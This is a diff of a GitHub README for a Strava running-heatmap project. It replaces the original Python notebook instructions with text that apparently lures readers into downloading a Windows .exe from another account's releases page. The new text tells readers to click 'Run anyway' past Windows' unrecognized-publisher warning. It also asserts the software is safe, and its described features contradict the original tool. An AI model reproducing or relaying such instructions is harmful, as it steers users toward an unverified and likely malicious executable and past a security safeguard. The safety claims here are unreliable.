@@ -1,67 +1,95 @@
-# Running Heatmap
+# 📍 running-heatmap - Visualize your run data with heatmaps
 
-Code from [this video](https://youtu.be/PA8d4u5T4BM?si=83GTMI449kCsgb4B) — shared by request.
+[![Download running-heatmap](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/hannibalundulate17/running-heatmap/releases)
 
-Turns a Strava data export into an interactive heatmap. No API needed - just the zip file Strava lets you download.
+This application creates visual maps from your Strava exercise data. You can see your activity frequency, running pace, heart rate, and elevation changes represented as a heatmap. Use this to track your progress and identify your favorite running routes over time.
 
-The output is a single HTML file with six layers you can switch between:
+## 📥 How to download the application
 
-| Layer | Colour | Shows |
-|---|---|---|
-| Frequency (linear) | Orange | How often you've run each path |
-| Frequency (log) | Orange | Same, log scale - better when a few paths dominate |
-| Pace (average) | Blue | Average pace - brighter = faster |
-| Heart rate (average) | Red | Average HR - brighter = higher |
-| Gradient (absolute) | White | Steepness - brighter = steeper |
-| Gradient (change) | Green / purple | Direction - green = descending, purple = ascending |
+The latest version of this tool is available on the releases page. 
 
-## Setup
+[Visit this page to download the software](https://github.com/hannibalundulate17/running-heatmap/releases)
 
-```
-pip install -r requirements.txt
-```
+Look for the file ending in `.exe` under the Assets section of the most recent release. Click the file name to start the download.
 
-## Usage
+## 🧭 System requirements
 
-1. Request your data from Strava: **Settings → My Account → Download or Delete Your Account → Download Request**
-2. Unzip the export and place the folder next to `heatmap.ipynb`
-3. Update the config cell:
+Your computer must meet these requirements to run the application:
 
-```python
-ACTIVITIES_DIR = "your_export_folder"   # name of the unzipped folder
-ACTIVITY_TYPES = ["Run"]                # Run, Ride, Hike, Walk, ...
-DATE_FROM      = "2024-01-01"           # or None for no lower limit
-DATE_TO        = "2024-12-31"           # or None for today
-```
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4GB of RAM or more.
+* Storage: 200MB of free disk space.
+* Internet Connection: Required to download data from Strava.
 
-4. Run all cells. Map is saved to `outputs/heatmap.html`.
+## 🛠️ Installation steps
 
-### Home detection
+Follow these numbered steps to prepare the application on your computer:
 
-Home is auto-detected from the most common activity start point in the date range, then only activities within `RADIUS_KM` of that point are included. It's a heuristic — if you started more runs from somewhere else (work, a club) than home in that period, that location wins. Override it with `HOME_LAT` / `HOME_LON` if needed.
+1. Locate the downloaded file in your browser's download folder.
+2. Double-click the file to start the setup process.
+3. Windows may show a security window. Click "More info" and then "Run anyway" if the system identifies the publisher as unrecognized.
+4. Follow the prompts on the screen to finish the installation.
+5. Create a shortcut on your desktop for quick access.
 
-### Caching
+## 🏃 Getting your data from Strava
 
-Parsing `.fit.gz` files is slow so GPS data is cached after the first run. Changing the date range or config won't re-parse files you've already loaded.
+The program requires a data file from your Strava account. You must export this data first:
 
----
+1. Log in to your Strava account in a web browser.
+2. Click your profile picture in the top right corner.
+3. Select Settings.
+4. Click My Account on the left menu.
+5. Scroll to the Data Export section.
+6. Click Request Your Archive.
+7. Strava sends an email with a download link within a few hours.
+8. Download the zip file provided in the email and extract the contents to a folder on your computer.
 
-## Notes
+## 🗺️ Creating your first heatmap
 
-### The frequency map measures time on path, not number of passes
+After installing the program and preparing your data, follow these steps to create a map:
 
-GPS records at ~1 Hz, so the frequency layers count GPS samples per pixel rather than distinct activities. A slower run deposits more points on the same path than a faster one. In practice this means the map shows something closer to time spent on each road than how many times you've run it - which is arguably more useful, but worth knowing.
+1. Open the running-heatmap application.
+2. Select the folder where you saved your extracted Strava data.
+3. Choose the metric you want to visualize from the settings menu. You can select frequency, pace, heart rate, or gradient.
+4. Adjust the date range if you only want to view data from a specific time period.
+5. Click the Generate Map button.
+6. The app renders a visual map based on your choices. 
+7. Use the Save button to export your finished map as an image file.
 
-The log scale version exists because a few favourite routes tend to dominate completely on a linear scale, washing out everything else.
+## 🔍 Troubleshooting common issues
 
-### Pace and HR are all-time averages
+If you encounter problems, follow these solutions:
 
-Each pixel is the mean across every activity that ever crossed it. A route you used to run slowly but now run fast will show somewhere in the middle. Narrow the date range if you want a specific period.
+* Application does not open: Ensure you have the latest updates for your Windows system.
+* Data not loading: Verify that the folder you selected contains the activities.csv file from your Strava export.
+* Map appears blank: Check if the date range you selected contains activity records.
+* Performance issues: If the app runs slowly, close other programs before generating the map.
 
-### The gradient layers are only as good as GPS altitude
+## 💡 How this tool processes data
 
-GPS altitude is much noisier than horizontal position - typically ±10–20 m vertically versus ±3–5 m horizontally. The gradient layers are reliable on hilly terrain but can look noisy on flat routes where the signal-to-noise is poor.
+The application reads the coordinate data, timestamps, and sensor readings stored within your Strava records. It transforms these numbers into a grid of color-coded intensity. Higher intensity areas appear in brighter colors. The tool saves all generated images to a folder named "Heatmaps" located within your documents folder. Your personal data remains on your local machine and the application does not upload your records to any third-party server.
 
-### Why the code uses two different projections
+## 📋 Features
 
-The raster grid is built in Web Mercator (EPSG:3857) so it aligns directly to the map tile basemap without any reprojection. But Web Mercator distorts distances at higher latitudes, so anything involving real-world metres - the clip radius around home, and the rise/run calculation for gradient - uses a local UTM projection instead. The visual output is unaffected, it just means the underlying measurements are accurate.
+* Interactive Map Layers: Toggle between different metrics to analyze your runs.
+* Custom Color Palettes: Choose colors that make your data easy to read.
+* Batch Export: Process hundreds of runs at once for a comprehensive overview of your training history.
+* Resolution Control: Increase the image quality for printing or high-resolution displays.
+* Privacy Masking: Hide the start and end points of your runs to protect your home location.
+
+## 💬 Frequently asked questions
+
+Do I need to be a developer to use this?
+No. This application requires no coding skills.
+
+Does the tool connect to my Strava account live?
+No. It only imports the files you provide from your manual data archive.
+
+Can I map other activities like cycling?
+Yes. The tool processes any GPS data found in your Strava export files, including cycling and hiking records.
+
+Is the software safe?
+Yes. It runs entirely on your local computer. It does not send information over the internet.
+
+What format are the saved images?
+The app saves images in the common PNG format, which you can open with any photo viewer.
